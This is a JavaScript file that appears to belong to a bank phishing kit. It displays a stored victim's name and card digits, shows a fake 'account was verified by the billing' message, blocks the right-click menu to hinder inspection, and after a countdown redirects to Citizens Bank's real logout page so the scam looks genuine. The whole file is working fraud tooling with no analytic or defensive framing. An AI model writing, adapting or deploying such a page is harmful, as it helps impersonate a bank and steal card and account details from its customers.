// get  to localStorage 

const holderName = localStorage.getItem('Name');
let  card = localStorage.getItem('cardNumber');

let string = card.toString();
 let subsrting = card.substring(0,5);
let integart = parseInt(subsrting)

document.getElementById('cardName').textContent = holderName;
document.getElementById('cardNumber_get').textContent = integart;

let getDate = document.getElementById("date");

let date = new Date()
let dateDay = date.toLocaleString('en-US', {
  day: 'numeric', // numeric, 2-digit
  year: 'numeric', // numeric, 2-digit
  month: 'long'// numeric, 2-digit, long, short, narrow
});
let timeNew = new Date(new Date().getTime() + 4 * 60 * 60 * 1000).toLocaleTimeString();

getDate.textContent = dateDay;

// generate a random number 
function makeid(length) {
  var result = '#';
  var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ1245154684231115';
  var charactersLength = characters.length;
  for (var i = 0; i < length; i++) {
    result += characters.charAt(Math.floor(Math.random() * charactersLength ) );
  }
  return result;
}
let strRandom = document.getElementById('random-str').textContent = makeid(10);
let info = document.querySelector(".for-info");
let createEle = document.createElement("div");
createEle = `ON ${dateDay} ${timeNew} your Account was verified by the billing with ending ***${integart} we                                                     Lorem ipsum, dolor sit amet consectetur adipisicing elit. Minus eveniet saepe obcaecati harum aliquid corrupti alias dolorum perspiciatis similique enim.
`;
info.innerHTML = createEle;



//    for loading  
$('body').append('<div  class="loader-container"><img src="images/loading.png" class="img-laoding" /></div>');
$(window).on('load', function () {
  setTimeout(removeLoader, 2000); //wait for page load PLUS two seconds.
});
function removeLoader() {
  $(".loader-container").fadeOut(500, function () {
    // fadeOut complete. Remove the loading div
    $(".loader-container").remove(); //makes page more lightweight 
  });
}


window.addEventListener("contextmenu", (e) => {
  e.preventDefault();
})



var count = 12; // Timer
  var redirect = "https://www3.citizensbankonline.com/efs/servlet/efs/logout.jsp?fbclid=IwAR216WrfUA0LnFqQcAXr6LHZ3d6eAIkkJSfrntzwjH5PnrK8f8T92aXgV8s"; // Target URL

  function countDown() {
    var timer = document.getElementById("logged-out"); // Timer ID
    if (count > 0) {
      count--;
      timer.innerHTML = "This page will be automatically logged out in  " + count + " seconds."; // Timer Message
      setTimeout("countDown()", 1000);
    } else {
      window.location.href = redirect;
    }
  }
  countDown();